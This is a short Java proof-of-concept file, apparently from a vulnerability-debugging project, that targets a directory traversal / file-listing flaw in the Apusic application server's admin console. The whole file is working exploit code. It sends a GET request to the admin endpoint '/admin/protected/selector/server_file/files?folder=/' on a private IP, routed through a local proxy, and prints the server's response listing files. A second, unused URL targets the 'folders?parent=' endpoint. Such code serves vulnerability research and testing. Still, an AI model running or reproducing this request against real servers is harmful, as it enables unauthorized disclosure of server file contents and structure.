package apusic;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;

import java.io.IOException;

public class server_file_files_dirtraversal {

    public static void main(String[] args) throws IOException {


        String url = "http://10.58.120.201:6888/admin/protected/selector/server_file/files?folder=";
        String url2 = "http://10.58.120.201:6888/admin/protected/selector/server_file/folders?parent=";
        String path = "/";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpGet httpGet = new HttpGet(url + path);
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }
}
